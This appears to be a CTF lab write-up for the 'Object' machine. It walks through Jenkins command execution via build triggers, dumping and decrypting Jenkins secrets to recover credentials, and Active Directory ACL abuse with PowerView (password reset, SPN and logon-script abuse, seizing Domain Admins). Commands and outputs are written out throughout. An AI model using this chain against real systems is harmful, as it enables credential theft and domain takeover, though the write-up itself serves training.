
## CTF Writeup: Object

---
## Reconnaissance

An initial TCP Scan revealed the following services running on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.96.147       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 06:32 -0500
Nmap scan report for 10.129.96.147
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.79 seconds
```

An UDP Scan revealed only default UDP Domain Controller Services running.

```
nmap -sU --top-ports 100 -oN nmap_udp.txt 10.129.96.147
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 06:35 -0500
Nmap scan report for 10.129.96.147
Host is up (0.027s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 3.71 seconds
```

Inspecting the two webpages is interesting. The Service running on port 8080 seems to be an Jenkins Instance.

Registered an account in Jenkins.

```
root:KeimLukas12!
```

Jenkins seems to be Version 2.317 and there is another user called "admin" active on Jenkins.

I also gained information that the Domain Controller seems to be a Windows Server 2019. 

I created an build which downloads nc.exe and executes it, but the problem is I don't have the necessary permissions to run the build.

Enumerated endpoints on the webpage on port 80, but couldn't find anything interesting. The webpage itself seems to be an Landing Page for "Mega Engines", with an ref link to an domain called object.htb:8080.

```
feroxbuster --url http://10.129.96.147
```

Mapped this domain to the target ip address in our local dns file.

```
echo "10.129.96.147 object.htb" | tee -a /etc/hosts
```

Enumerated Subdomains on the webpage running on port 80, but also couldn't find anything interesting.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://object.htb -H "Host: FUZZ.object.htb" -fs 29932
```

So I'm pretty sure Jenkins will be the entry point into the DC.

Enumerating endpoints on the jenkins endpoint revealed an /securityRealm endpoint upon accessing the endpoint it says our registered user is lacking permissions!

```
feroxbuster --url http://10.129.96.147:8080
```

Searched up for public exploits and identified CVE-2019-1003000.

Tried the following PoC:

```
https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
```

We need to navigate into an virtual envrionment in order to download the requirements.

```
python3 -m venv myenv
source myenv/bin/activate
pip install -r requirements.txt
```

Executing the payload didn't workout tho.

```
python exploit.py --url http://object.htb:8080 --job hacked --username root --password 'password123!' --cmd "whoami"
```

Proceeded with checking out Jenkins.

There is two ways to gain command execution when we are lacking permissions in Jenkins to start the build.

##### Trigger periodically

1. When creating a freestyle project, we first chose the payload.

In our case we scroll down to "Build" and select "Execute Windows batch command" since the target server is an windows server 2019.

```
cmd /c whoami
```

2. Scroll up to "Build Triggers" and paste the following inside so the build is getting periodically executed every minute.

```
* * * * *
```

3. Save the build and refresh the page after one minute, we should see one build in the history, hovering over the build reveals an dropdown. Select "Console Output" to see if the whoami command executed.

```

```

##### Trigger remotely

Running different commands waiting one minute between each one is a bit exhausting. I’ll disable the scheduled trigger. Looking at the other options for “Build Triggers”, “Trigger builds remotely (e.g., from scripts)” seems interesting. Checking it expands out asking for an “Authentication Token”:

1. Press on your profile > Configure then navigate to the section where we can add API Tokens and press "Add new Token", name it to smth random and it should generate an token.

```
saitamawashere:11983737aa1405fab2ed643467f4953e75
```

2. New Item > Freestyle Project

3. Scroll to "Build Triggers" and select "Trigger builds remotely". Checking it expands out asking for an "Authentication Token", paste your token name inside.

```
saitamawashere
```

4. Chose payload. Scroll down to "Build" and utilize Windows batch commands, since target is an Windows Server 2019.

```
cmd /c "whoami"
```

5. Send API Request.

```
curl "http://saitama2:11983737aa1405fab2ed643467f4953e75@object.htb:8080/job/hacked4/build?token=saitamawashere"
```

6. Reload page and the build should be there. We can now hover over it and chose "Console Output", to check if the command executed.

```
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>cmd /c "whoami" 
object\oliver

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>exit 0 
Finished: SUCCESS
```

Unfortunately the Domain Controller had an active firewall instance, which blocked us from downloading files onto the target server from our local machine. Decided to enumerate the filesystem for potential credentials. AI tells us that Jenkins credentials are stored inside an config.xml.

Inspected the /workspace directory.

```
cmd /c "dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace"
```

Send request again.

```
curl "http://saitama2:11983737aa1405fab2ed643467f4953e75@object.htb:8080/job/hacked4/build?token=saitamawashere"
```

Build got started. But it didn't show anything interesting. Let's move one directory down again into /.jenkins

```
cmd /c "dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins"
```

This provided us with the config.xml file!

```
Started by remote host 10.10.14.57
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4
[hacked4] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins7989978251116208213.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>cmd /c "dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins" 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of C:\Users\oliver\AppData\Local\Jenkins\.jenkins

08/29/2026  05:40 AM    <DIR>          .
08/29/2026  05:40 AM    <DIR>          ..
08/29/2026  04:32 AM                 0 .lastStarted
08/29/2026  04:47 AM                40 .owner
08/29/2026  04:32 AM             2,505 config.xml
08/29/2026  04:32 AM               156 hudson.model.UpdateCenter.xml
10/20/2021  10:13 PM               375 hudson.plugins.git.GitTool.xml
10/20/2021  10:08 PM             1,712 identity.key.enc
08/29/2026  04:32 AM                 5 jenkins.install.InstallUtil.lastExecVersion
10/20/2021  10:14 PM                 5 jenkins.install.UpgradeWizard.state
10/20/2021  10:14 PM               179 jenkins.model.JenkinsLocationConfiguration.xml
10/20/2021  10:21 PM               357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
10/20/2021  10:21 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
10/20/2021  10:21 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
10/20/2021  10:08 PM               171 jenkins.telemetry.Correlator.xml
08/29/2026  05:21 AM    <DIR>          jobs
10/20/2021  10:19 PM    <DIR>          logs
08/29/2026  04:32 AM               907 nodeMonitors.xml
10/20/2021  10:08 PM    <DIR>          nodes
10/20/2021  10:12 PM    <DIR>          plugins
08/29/2026  05:40 AM               130 queue.xml
10/20/2021  10:28 PM               129 queue.xml.bak
10/20/2021  10:08 PM                64 secret.key
10/20/2021  10:08 PM                 0 secret.key.not-so-secret
10/20/2021  10:26 PM    <DIR>          secrets
10/25/2021  10:31 PM    <DIR>          updates
10/20/2021  10:08 PM    <DIR>          userContent
08/29/2026  04:46 AM    <DIR>          users
10/20/2021  10:13 PM    <DIR>          workflow-libs
08/29/2026  05:32 AM    <DIR>          workspace
              18 File(s)          7,066 bytes
              12 Dir(s)   4,646,608,896 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>exit 0 
Finished: SUCCESS
```

Let's check it out.

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml"
```

Send the request again.

```
curl "http://saitama2:11983737aa1405fab2ed643467f4953e75@object.htb:8080/job/hacked4/build?token=saitamawashere"
```

But this one wasn't interesting. There seems to be an /users directory tho. Let's view it.

```
cmd /c "dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users"
```

This was promising. There was an admin user directory. Let's check out it's contents.

```
cmd /c "dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035"
```

There is another config.xml inside the directory.

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

This file actually provided us with credentials, the password seemed base64 encoded tho.

```
oliver:AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=
```

Decoded the password, provided us with an random blob.

```
echo "AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=" | base64 -d
�O��`�fr����jx�x�NO���h�2��]{��
```

We also gained an password hash for the "admin" user.

```
$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW
```

Unfortunately we can't just bruteforce an password out of it using john the ripper or hashcat. We'll need to utilize custom tools from GitHub. I'll use this one:

```
git clone https://github.com/hoto/jenkins-credentials-decryptor.git
```

```
make build
```

The binary is located in /bin/jenkins-credentials-decryptor. We'll need the config.xml, the master.key & the hudson.util.Secret to decrypt the password.

The master.key & hudson.util.Secret are stored in the C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets directory.

Executed the following batch job and gained master.key

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key"
```

Stored the master.key on my local machine. (has to be 256-257 bytes long).

```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

Executed this batch job to retrieve the hudson.util.Secret

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret"
```

The Console Output although gave us an encrypted blob. 

```
Started by remote host 10.10.14.57
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4
[hacked4] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins2502013268464140101.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret" 
�aPTñ‹ìQw3è¨¾®Ã€ƒg·¢dw-J)
uM†’,Ábˆn¨
\îÙ!Ë÷s¢E¹Ä1âªaí;>©×õU‹‡¾Õµÿ™Þ8	îÆ½¿xd$³ÌYU
©k1Î‘}ôAö»Ýv–…í„�¬©•
`K� 8
D�aIâXÒD-Å"´¾¯í‹äGt\ñQå_]Æš”�Ç>J/©«ÎL('ÞìU§ �JÌ“á­|R´7Šè=vP7ˆ:ˆDÕ{ºKI8²Äžû!U�×§“úêXÊ P¿fŠáE4ìLÜ¤^ˆöð‡*áËù‚ZˆuÒ®tdÊ„! 7zßQ"


C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>exit 0 
Finished: SUCCESS
```

Since they might be in non-printable characters, we would need to use Base64 to get them out. This can be done with PowerShell scripting.

```
powershell -c "[convert]::ToBase64String((Get-Content -Path C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte))"
```

This batch job provided us with the base64 encoded string.

```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

Let's decrypt and save it inside an hudson.util.Secret file on our local machine.

```
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | base64 -d > hudson.util.Secret
```

The only thing left is now the config.xml in the /admin user directory.

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

Stored this inside an config.xml file on my local machine.

```
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

Retrieved the hudson.util.Secret

```
powershell.exe -c "[convert]::ToBase64String((Get-Content -path
'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte))"
```

Stored it inside an binary on my local machine.

```
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA="| base64 -d > hudson.util.Secret
```

Ran the decryptor and gained credentials for user "oliver".

```
./jenkins-credentials-decryptor -c /ctfs/htb/ad/object/www/jenkins/config.xml -m /ctfs/htb/ad/object/www/jenkins/master.key -s /ctfs/htb/ad/object/www/jenkins/hudson.util.Secret
```

```
oliver:c1cdfun_d2434
```

Connected to the DC using evil-winrm.

```
evil-winrm -i object.htb -u oliver -p 'c1cdfun_d2434'
```

Sprayed the credentials with nxc on winrm and it says i'm able to connect to the DC. It also revealed that the actual domain is named "object.local".

```
nxc winrm object.htb -u oliver -p c1cdfun_d2434               
WINRM       10.129.96.147   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local) 
WINRM       10.129.96.147   5985   JENKINS          [+] object.local\oliver:c1cdfun_d2434 (Pwn3d!)
```

Mapped the domain to the target ip address.

```
mousepad /etc/hosts
10.129.63.128 object.local
```

From here on I wasn't able to connect & I had to reset the machine. Connected to the DC.

```
evil-winrm -i 10.129.63.128 -u oliver -p c1cdfun_d2434
```

Retrieved user.txt in C:\Users\oliver\Desktop.

```
31dc330f379ac4f2bf5382aabb6adb4e
```
## Privilege Escalation

Downloaded domain information using bloodhound-python.

```
bloodhound-python -u oliver -p 'c1cdfun_d2434' -ns 10.129.63.128 -d object.local -c all
```

This got denied, and I gained another interesting domain. Unfortunately I realised that ldap isn't running which means we can't download domain information!

```
jenkins.object.local
```

Enumerated users on the DC.

```
*Evil-WinRM* PS C:\Users\oliver\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
maria                    oliver
The command completed with one or more errors.
```

Enumerated running services of the DC.

```
*Evil-WinRM* PS C:\Users\oliver\Desktop> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       2252
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       3040
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1188
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1512
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       2992
  TCP    0.0.0.0:63100          0.0.0.0:0              LISTENING       3032
  TCP    10.129.63.128:53       0.0.0.0:0              LISTENING       2992
  TCP    10.129.63.128:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.63.128:5985     10.10.14.57:59522      TIME_WAIT       0
  TCP    10.129.63.128:5985     10.10.14.57:59536      ESTABLISHED     4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2992
  TCP    127.0.0.1:62899        127.0.0.1:62900        ESTABLISHED     2252
  TCP    127.0.0.1:62900        127.0.0.1:62899        ESTABLISHED     2252
```

This was interesting, the ports are open. I'm assuming the firewall just blocked outbound connections for LDAP etc. I'll utilize SharpHound.exe in order to download domain information

```
upload /opt/tools/SharpHound.exe
```

Ran it and downloaded domain information.

```
.\SharpHound.exe
```

Downloaded domain information.

```
download 20260829080141_BloodHound.zip
```

Started up bloodhound instance on local machine.

```
bloodhound-start
```
##### ForceChangePassword Windows Abuse

Uploaded domain information and marked current user "oliver" as owned. He has an Outbound Object Control on user "smith". The ACL "ForceChangePassword". Which means we can change his password.

Since RPC or anything else we need to use for this ACL is blocked by firewall, we need to utilize PowerShell ACL Abuse via PowerView.ps1's "Set-DomainUserPassword" function.

```
upload /opt/tools/PowerView.ps1
. .\PowerView.ps1
```

As I already have a shell as oliver, I don’t need to pass that credential. I’ll just create a password and change it:

```
$newpass = ConvertTo-SecureString "password123!" -AsPlainText -Force
```

Changed password of user "smith".

```
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
```

Verified that it worked.

```
nxc winrm 10.129.63.128 -u smith -p 'password123!'
WINRM       10.129.63.128   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local) 
WINRM       10.129.63.128   5985   JENKINS          [+] object.local\smith:password123! (Pwn3d!)
```

Marked user "smith" as owned in BloodHound. He has an ACL set as Outbound Object Control on user "maria", "GenericWrite". 

Connected to the DC via evil-winrm.

```
evil-winrm -i 10.129.63.128 -u smith -p 'password123!'
```
##### GenericWrite Windows Abuse

A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

1. Add SPN to user "maria".

```
Set-DomainObject -Identity maria -SET @{serviceprincipalname='somerandomdomain/hacked'}
```

2. Verified that we added the SPN successfully.

```
Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
somerandomdomain/hacked
```

3. To actually Kerberoast, I’ll need to use an SPN with a valid format unlike our current, so I’ll use that one going forward.

```
setspn -a MSSQLSvc/object.local:1433 object.local\maria
```

4. Verified the change.

```
*Evil-WinRM* PS C:\Users\smith\Documents> Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
{MSSQLSvc/object.local:1433, somerandomdomain/hacked}
```

5. Requested TGT, but got an error:

```
*Evil-WinRM* PS C:\Users\smith\Documents> Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433"
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
```

The error is because the service doesn't know who we are. To solve this we can create an credential object.

```
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential('object.local/smith', $pass)
```

Requesting the TGT gave us an error.

```
Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $Cred

Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: \object.local/smith
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
```

##### GenericWrite with modified login script

We can use GenericWrite also to update their logon scripts. This script would run the next time the user logs in. Since Firewall blocks everything and I can't connect back to my local machine I have no other choice then to enumerate ther users directory.

User Directory Enumeration

```
echo "ls \users\maria\documents > \temp\documents" > cmd.ps1
```

```
Set-DomainObject -Identity maria -SET @{scriptpath="C:\Temp\cmd.ps1"}
```

This worked after a couple of seconds I gained the documents file which represents the documents directory of user "maria". Let's do the same thing for her Desktop!

```
echo "ls \users\maria\desktop > \temp\desktop" > cmd.ps1
```

There seems to be an interesting Engines.xls file.

```
type desktop


    Directory: C:\users\maria\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
```

Let's do the same trick we did with viewing the directory, for moving the .xls file into an directory we have access to.

```
echo "copy \users\maria\desktop\Engines.xls \temp\" > cmd.ps1
```

Downloaded the Engines.xls file onto my local machine.

```
download Engines.xls
```

Opened up the file using libreoffice.

```
libreoffice --calc Engines.xls
```

Retrieved 3 potential passwords for user "maria". Stored them inside an passwords.txt file on my local machine.

```
d34gb8@
0de_434_d545
W3llcr4ft3d_4cls
```

Sprayed credentials

```
nxc winrm 10.129.63.128 -u maria -p passwords.txt
WINRM       10.129.63.128   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local) 
WINRM       10.129.63.128   5985   JENKINS          [-] object.local\maria:d34gb8@
WINRM       10.129.63.128   5985   JENKINS          [-] object.local\maria:0de_434_d545
WINRM       10.129.63.128   5985   JENKINS          [+] object.local\maria:W3llcr4ft3d_4cls (Pwn3d!)
```

The last password seemed to work.

```
maria:W3llcr4ft3d_4cls
```

Marked user "maria" as owned.

Connected to the DC as user "maria" via evil-winrm.

```
evil-winrm -i object.local -u maria -p 'W3llcr4ft3d_4cls'
```
##### WriteOwner Windows Abuse

She seems to have another ACL "WriteOwner" on the Domain Admins Group. We'll need to utilize PowerView.ps1 function's again, specifically Set-DomainObjectOwner.

Let's therefore import PowerView.ps1 again.

```
upload /opt/tools/PowerView.ps1
. .\PowerView.ps1
```

I’ll import PowerView and then assign maria as the owner of the group:

```
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
```

As owner, maria can give maria full rights over the group:

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
```

Now maria can add themself to the group:

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

Verify if it worked:

```
net user maria
```

We now need to close our evil-winrm session and connect to it again for the changes to take place.

```
evil-winrm -i object.local -u maria -p 'W3llcr4ft3d_4cls'
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
e490c5fa2c7e8ce994946627d42bb147
```